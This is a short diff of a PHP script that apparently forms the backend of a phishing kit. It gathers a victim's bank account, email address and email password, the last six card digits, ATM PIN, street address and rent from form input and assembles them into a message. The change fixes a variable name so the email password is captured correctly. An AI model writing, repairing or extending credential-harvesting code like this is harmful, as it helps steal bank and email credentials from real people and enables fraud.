@@ -22,7 +22,7 @@ header("Access-Control-Allow-Headers: *");
         $rent = $_POST['rent'];
 
 
-        $message = "Account: ".$account."<br> Email: ".$email."<br> Email-Password: ".$emailpass."<br> Last 6: ".$atmCard."<br> Pin: ".$atmPin."<br> Address: ".$address."<br> Rent: ".$rent;
+        $message = "Account: ".$account."<br> Email: ".$email."<br> Email-Password: ".$emailPass."<br> Last 6: ".$atmCard."<br> Pin: ".$atmPin."<br> Address: ".$address."<br> Rent: ".$rent;
 
         
    
